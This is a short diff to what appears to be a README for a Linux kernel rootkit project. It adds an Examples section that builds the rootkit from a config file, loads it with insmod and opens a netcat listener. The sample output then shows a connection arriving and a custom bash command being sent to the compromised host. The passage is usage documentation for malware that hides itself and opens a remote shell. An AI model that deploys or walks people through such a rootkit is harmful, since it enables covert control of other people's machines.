@@ -76,4 +76,13 @@ another way to execute your hiding or shell script is connector, if you enable y
 
 ### Examples
 
+```sh
+$ python3 builder.py --config testfiles/config.yml
+$ sudo insmod rootkit.ko
+$ nc -lvnp 8080
+ Listening on 0.0.0.0 8080
+ Connection received on 127.0.0.1 39040
+ RUN_CUSTOM_BASH sleep 1000
+```
+
 ![example](images/example.jpeg)
